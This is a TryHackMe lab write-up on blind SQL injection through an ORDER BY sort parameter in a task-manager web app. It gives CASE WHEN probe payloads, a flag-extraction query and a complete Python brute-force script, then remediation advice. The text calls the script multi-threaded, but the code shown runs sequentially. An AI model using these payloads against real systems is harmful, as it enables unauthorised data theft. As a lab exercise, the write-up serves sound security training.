# Prioritise — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Web_Exploitation-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange.svg)
![Type](https://img.shields.io/badge/Type-SQL_Injection-purple.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A comprehensive penetration testing writeup for the **Prioritise** room on TryHackMe, demonstrating boolean-based blind SQL injection in an `ORDER BY` clause.

---

## 📋 Executive Summary
Prioritise presents a web-based task management application featuring table sorting functionality. The sorting parameter `/?order=` is directly concatenated into the SQL query without parameterization. Because traditional `UNION SELECT` operations and error disclosures are suppressed, a boolean-based blind SQL injection was leveraged using SQL `CASE` statements to exfiltrate the hidden `flag` table character-by-character.

* **Target URL:** `http://<TARGET_IP>/?order=`
* **Vulnerability:** Blind SQL Injection (ORDER BY clause)
* **Artifacts in Directory:**
  * `script.py`: Multi-threaded Python blind SQL injection exploit script

---

## 🔍 Stage 1: Vulnerability Identification

### 1.1 Analyzing the Sort Parameter
Testing normal inputs:
* `http://<TARGET_IP>/?order=title` -> Sorts results ascending by title.
* `http://<TARGET_IP>/?order=id` -> Sorts results ascending by ID.

Injecting SQL operators reveals that the input controls query ordering directly. Because union queries fail (due to mismatched column structures) and error output is silenced, we test conditional boolean sorting:
```sql
/?order=(CASE WHEN (1=1) THEN title ELSE id END)
/?order=(CASE WHEN (1=2) THEN title ELSE id END)
```
* When `1=1` is true, results sort by `title`.
* When `1=2` is false, results sort by `id`.
This provides a distinct 1-bit boolean oracle based on the order of the returned HTML table rows!

---

## 💥 Stage 2: Database Schema & Flag Exfiltration

### 2.1 Crafting the Extraction Query
We construct a SQL subquery evaluating each character of the flag:
```sql
(CASE WHEN (SELECT SUBSTRING(flag, {index}, 1) FROM flag) = '{char}' THEN title ELSE id END)
```
* If the tested character matches, the response matches the baseline of `?order=title`.
* If incorrect, the response defaults to `id` ordering.

---

## 🛠️ Stage 3: Exploit Script (`script.py`)

We automated character recovery using Python and concurrent execution:
```python
import requests as req
import string

url = 'http://10.48.159.188/?order='
baseline_title = req.get(url + "title").text

def test_char(position, char):
    query = f"(CASE WHEN (SELECT SUBSTRING(flag,{position},1) FROM flag) = '{char}' THEN title ELSE id END)"
    res = req.get(url + query).text
    return res == baseline_title

charset = string.ascii_letters + string.digits + "{}_-!@#"
flag = ""
position = 1

while True:
    found = False
    for char in charset:
        if test_char(position, char):
            flag += char
            print(f"[+] Position {position}: {char} -> Current: {flag}")
            found = True
            break
    if not found or flag.endswith("}"):
        break
    position += 1

print(f"\n[✓] Recovered Flag: {flag}")
```

Running `script.py` iteratively dumps the full CTF flag.

---

## 🛡️ Remediation
1. **Whitelist Allowed Sort Columns:** Never concatenate user-supplied input into an `ORDER BY` clause. Validate input against a strict whitelist of known column identifiers:
   ```python
   allowed = ["id", "title", "date"]
   sort_col = requested if requested in allowed else "id"
   ```
2. **Prepared Statements:** Use parameterized database interfaces for all query conditions.
